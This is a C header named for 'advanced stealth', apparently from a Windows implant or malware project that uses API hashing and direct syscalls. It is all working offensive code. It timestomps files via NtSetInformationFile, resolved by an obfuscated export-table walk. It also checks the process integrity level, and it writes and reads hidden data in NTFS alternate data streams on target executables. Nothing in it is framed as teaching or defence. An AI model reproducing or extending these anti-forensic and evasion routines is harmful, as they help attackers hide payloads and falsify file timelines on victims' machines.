#ifndef ADVANCED_STEALTH_H
#define ADVANCED_STEALTH_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"
#include "syscalls.h"
#include "crypto.h"

extern PVOID     g_SyscallGadget;
extern API_TABLE g_ApiTable;

// =============================================================================
// TIMESTOMP VIA NtSetInformationFile (SYSCALL-BASED)
// =============================================================================

// FILE_BASIC_INFORMATION for NtSetInformationFile (class 4)
typedef struct _FILE_BASIC_INFORMATION_EX {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    ULONG         FileAttributes;
} FILE_BASIC_INFORMATION_EX;

// NtSetInformationFile typedef
typedef NTSTATUS (NTAPI *NtSetInformationFile_t)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    ULONG FileInformationClass
);

static BOOL TimestompSyscall(LPCWSTR targetPath, LPCWSTR sourcePath) {
    // Get source file timestamps using standard API
    HANDLE hSource = CreateFileW(sourcePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                                  OPEN_EXISTING, 0, NULL);
    if (hSource == INVALID_HANDLE_VALUE) return FALSE;

    FILETIME ftCreate, ftAccess, ftWrite;
    BOOL gotTime = GetFileTime(hSource, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hSource);
    if (!gotTime) return FALSE;

    // Open target for writing attributes
    HANDLE hTarget = CreateFileW(targetPath, GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, 0, NULL,
                                  OPEN_EXISTING, 0, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) return FALSE;

    // Build FILE_BASIC_INFORMATION
    FILE_BASIC_INFORMATION_EX fbi = {0};
    fbi.CreationTime.LowPart   = ftCreate.dwLowDateTime;
    fbi.CreationTime.HighPart  = ftCreate.dwHighDateTime;
    fbi.LastAccessTime.LowPart = ftAccess.dwLowDateTime;
    fbi.LastAccessTime.HighPart = ftAccess.dwHighDateTime;
    fbi.LastWriteTime.LowPart  = ftWrite.dwLowDateTime;
    fbi.LastWriteTime.HighPart = ftWrite.dwHighDateTime;
    fbi.ChangeTime = fbi.LastWriteTime;
    fbi.FileAttributes = 0; // Don't change attributes

    // Resolve NtSetInformationFile from ntdll
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (!hNtdll) { CloseHandle(hTarget); return FALSE; }

    // Find via export walk (avoid adding another hash constant)
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);
    PDWORD pNames = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
    PWORD  pOrds  = (PWORD)((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);

    NtSetInformationFile_t pNtSIF = NULL;
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char *n = (const char *)((PBYTE)hNtdll + pNames[i]);
        // Match "NtSetInformationFile"
        if (n[0] == 'N' && n[2] == 'S' && n[5] == 'I' && n[16] == 'F') {
            pNtSIF = (NtSetInformationFile_t)((PBYTE)hNtdll + pFuncs[pOrds[i]]);
            break;
        }
    }

    BOOL result = FALSE;
    if (pNtSIF) {
        IO_STATUS_BLOCK iosb = {0};
        // FileBasicInformation = 4
        NTSTATUS status = pNtSIF(hTarget, &iosb, &fbi, sizeof(fbi), 4);
        result = (status == 0);
    }

    CloseHandle(hTarget);
    return result;
}

// =============================================================================
// INTEGRITY LEVEL DETECTION
// =============================================================================

typedef enum _INTEGRITY_LEVEL {
    IL_UNTRUSTED = 0,
    IL_LOW       = 1,
    IL_MEDIUM    = 2,
    IL_HIGH      = 3,
    IL_SYSTEM    = 4,
    IL_UNKNOWN   = 5
} INTEGRITY_LEVEL;

static INTEGRITY_LEVEL GetIntegrityLevel() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return IL_UNKNOWN;

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
    if (dwSize == 0) { CloseHandle(hToken); return IL_UNKNOWN; }

    BYTE *buffer = (BYTE *)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) { CloseHandle(hToken); return IL_UNKNOWN; }

    INTEGRITY_LEVEL level = IL_UNKNOWN;
    if (GetTokenInformation(hToken, TokenIntegrityLevel, buffer, dwSize, &dwSize)) {
        TOKEN_MANDATORY_LABEL *pTML = (TOKEN_MANDATORY_LABEL *)buffer;
        DWORD *pRid = GetSidSubAuthority(pTML->Label.Sid,
            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTML->Label.Sid) - 1));

        if (*pRid < SECURITY_MANDATORY_LOW_RID)         level = IL_UNTRUSTED;
        else if (*pRid < SECURITY_MANDATORY_MEDIUM_RID)  level = IL_LOW;
        else if (*pRid < SECURITY_MANDATORY_HIGH_RID)    level = IL_MEDIUM;
        else if (*pRid < SECURITY_MANDATORY_SYSTEM_RID)  level = IL_HIGH;
        else                                              level = IL_SYSTEM;
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    CloseHandle(hToken);
    return level;
}

static BOOL IsElevated() {
    return (GetIntegrityLevel() >= IL_HIGH);
}

// =============================================================================
// NTFS ALTERNATE DATA STREAMS
// =============================================================================

// Write data to an NTFS ADS (e.g., "C:\target.exe:hidden")
static BOOL WriteToADS(LPCWSTR filePath, LPCWSTR streamName, const void *data, DWORD dataSize) {
    // Build ADS path: "filePath:streamName"
    wchar_t adsPath[MAX_PATH * 2];
    int pos = 0;
    for (int i = 0; filePath[i] && pos < MAX_PATH * 2 - 64; i++) adsPath[pos++] = filePath[i];
    adsPath[pos++] = L':';
    for (int i = 0; streamName[i] && pos < MAX_PATH * 2 - 2; i++) adsPath[pos++] = streamName[i];
    adsPath[pos] = L'\0';

    HANDLE hFile = CreateFileW(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD written;
    BOOL ok = WriteFile(hFile, data, dataSize, &written, NULL);
    CloseHandle(hFile);
    return ok && (written == dataSize);
}

// Read data from an NTFS ADS
static BOOL ReadFromADS(LPCWSTR filePath, LPCWSTR streamName, void *buffer, DWORD bufSize, DWORD *bytesRead) {
    wchar_t adsPath[MAX_PATH * 2];
    int pos = 0;
    for (int i = 0; filePath[i] && pos < MAX_PATH * 2 - 64; i++) adsPath[pos++] = filePath[i];
    adsPath[pos++] = L':';
    for (int i = 0; streamName[i] && pos < MAX_PATH * 2 - 2; i++) adsPath[pos++] = streamName[i];
    adsPath[pos] = L'\0';

    HANDLE hFile = CreateFileW(adsPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    BOOL ok = ReadFile(hFile, buffer, bufSize, bytesRead, NULL);
    CloseHandle(hFile);
    return ok;
}

#endif
